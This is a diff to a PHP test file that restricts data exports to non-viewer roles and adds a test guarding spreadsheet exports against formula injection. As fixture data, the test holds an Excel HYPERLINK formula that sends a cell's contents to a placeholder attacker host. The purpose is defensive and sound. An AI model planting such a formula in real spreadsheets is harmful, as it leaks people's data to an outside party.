@@ -198,14 +198,34 @@ class DataTransferTest extends TestCase
         $this->assertSame(1, $result['created']['cable']); // the drop cable has no code to match on
     }
 
-    public function test_only_admins_import_but_everyone_exports()
+    public function test_only_admins_import_and_viewers_cannot_export()
     {
         $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]))
             ->post('/data/import', ['file' => $this->fileFrom('<kml/>', 'a.kml')])
             ->assertForbidden();
-
-        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Viewer]));
         $this->get('/data/export/kml')->assertOk();
+
+        // The export carries customer data on the port sheet.
+        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Viewer]));
+        $this->get('/data/export/kml')->assertForbidden();
+        $this->get('/data/export/xlsx')->assertForbidden();
         $this->get('/data/template')->assertOk();
+    }
+
+    public function test_exported_text_never_becomes_an_excel_formula()
+    {
+        Odc::factory()->for($this->area)->create(['code' => 'ODC-F', 'address' => '=HYPERLINK("http://evil.test/?d="&A2,"Klik")']);
+        $this->actingAs(User::factory()->create(['area_id' => $this->area->id, 'role' => Role::Teknisi]));
+
+        $file = tempnam(sys_get_temp_dir(), 'xlsx');
+        file_put_contents($file, $this->get('/data/export/xlsx')->assertOk()->streamedContent());
+        $zip = new \ZipArchive;
+        $zip->open($file);
+        $xml = $zip->getFromName('xl/worksheets/sheet1.xml');
+        $zip->close();
+        unlink($file);
+
+        $this->assertStringContainsString('HYPERLINK', $xml);
+        $this->assertStringNotContainsString('<f>', $xml);
     }
 }
